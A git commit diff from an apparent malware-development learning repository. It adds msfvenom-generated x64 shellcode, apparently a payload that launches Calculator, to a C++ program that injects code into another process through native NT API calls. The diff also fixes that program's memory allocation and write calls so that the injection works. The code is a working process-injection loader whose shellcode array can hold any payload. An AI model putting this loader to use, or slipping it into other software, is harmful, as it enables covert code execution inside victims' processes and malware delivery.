9d7c0a9f8216bc56e03d7f8f17a37fbd0acbc17f
Victor Campos <camposvictor035@gmail.com>
2024-06-06 17:09:18 -0300

    add code from msfvenom

--- windows/winapi-maldev/dll-injection/dll-inject.cpp
+++ windows/winapi-maldev/dll-injection/dll-inject.cpp
@@ -2,7 +2,7 @@
 #include <stdio.h>
 
 #define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
-#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
+#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
 #define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
 
 DWORD PID, TID = NULL;
--- windows/winapi-maldev/ntapi-shellcode/ntapi-inject.cpp
+++ windows/winapi-maldev/ntapi-shellcode/ntapi-inject.cpp
@@ -21,14 +21,35 @@ HMODULE GetModule(IN LPCWSTR moduleName)
 int main(int argc, char* argv[])
 {
     DWORD PID = 0;
-    NTSTATUS STATUS = NULL;
+    NTSTATUS STATUS = 0;
     HMODULE hNTDLL = NULL;
     LPVOID baseAddress = NULL;
     HANDLE hProcess = NULL;
     HANDLE hThread = NULL;
     
     /* const keyword makes it so sc is placed in .rdata */
-    CONST UCHAR sc[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
+    CONST UCHAR sc[] = 
+    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+    "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+    "\xd5\x63\x61\x6c\x63\x00";
+
     SIZE_T scSize = sizeof(sc);
     
     if (argc < 2)
@@ -62,7 +83,7 @@ int main(int argc, char* argv[])
     info("[ %ld ] --> [ 0x%p ]", PID, hProcess);
 
     //do NtAllocateVirtualMemory and NtWriteVirtualMemory
-    STATUS = alloc(hProcess, &baseAddress, 0, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    STATUS = alloc(hProcess, &baseAddress, 0, &scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (STATUS != STATUS_SUCCESS)
     {
         warn("Error: NtAllocateVirtualMemory returned NTSTATUS 0x%lx", STATUS);
@@ -70,7 +91,7 @@ int main(int argc, char* argv[])
     }
     okay("Allocated %ld bytes in process 0x%p", scSize, hProcess);
     
-    STATUS = write(hProcess, &baseAddress, sc, scSize, NULL);
+    STATUS = write(hProcess, &baseAddress, (PVOID)sc, scSize, NULL);
     if (STATUS != STATUS_SUCCESS)
     {
         warn("Error: NtWriteVirtualMemory returned NTSTATUS 0x%lx", STATUS);
@@ -89,6 +110,9 @@ int main(int argc, char* argv[])
     WaitForSingleObject(hThread, INFINITE);
     okay("Thread finished! Cleaning up...");
 
-    //cleanup
+    if(hThread) STATUS = close(hThread);
+    if(hProcess) STATUS = close(hProcess);
+
+    okay("Done!");
     return EXIT_SUCCESS;
 }
